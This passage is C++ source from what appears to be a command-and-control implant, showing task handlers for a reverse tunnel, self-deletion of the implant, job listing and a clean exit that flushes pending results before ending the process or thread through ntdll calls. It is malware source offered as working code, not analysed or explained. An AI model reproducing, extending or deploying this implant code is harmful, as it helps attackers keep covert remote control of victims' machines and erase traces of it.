    Self->Pkg->Int64( Package, COMMAND_TUNNEL_REVERSE );
    Self->Pkg->Int16( Package, result );

    return KhRetSuccess;
}

auto DECLFN Task::SelfDel(
    _In_ JOBS* Job
) -> ERROR_CODE {
    
     Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );

     return KhGetError;
}

auto DECLFN Task::Jobs(
    _In_ JOBS* Job
) -> ERROR_CODE {
    auto Package = Job->Pkg;
    auto Parser  = Job->Psr;

    Action::Job JobSubId = (Action::Job)Self->Psr->Int32( Parser );

    switch ( JobSubId ) {
    case Action::Job::List: {
        JOBS* Current = Self->Jbs->List;

        Self->Pkg->Int32( Package, Self->Jbs->Count );

        while ( Current ) {
            Self->Pkg->Str( Package, Current->UUID );
            Self->Pkg->Int32( Package, Current->CmdID );
            Self->Pkg->Int32( Package, Current->State );

            Current = Current->Next;
        }
    }
    case Action::Job::Remove: {
        // todo
    }
    }
    
    return KhRetSuccess;
}

auto DECLFN Task::Exit(
    _In_ JOBS* Job
) -> ERROR_CODE {
    Action::Exit ExitType = (Action::Exit)Self->Psr->Byte( Job->Psr );

    Job->State    = KH_JOB_READY_SEND;
    Job->ExitCode = EXIT_SUCCESS;

    Self->Jbs->Send( Self->Jbs->PostJobs );
    Self->Jbs->Cleanup();

    Self->Hp->Clean();

    if ( ExitType == Action::Exit::Proc ) {
        Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
    } else if ( ExitType == Action::Exit::Thread ) {
        Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
    }

    return KhRetSuccess;
}

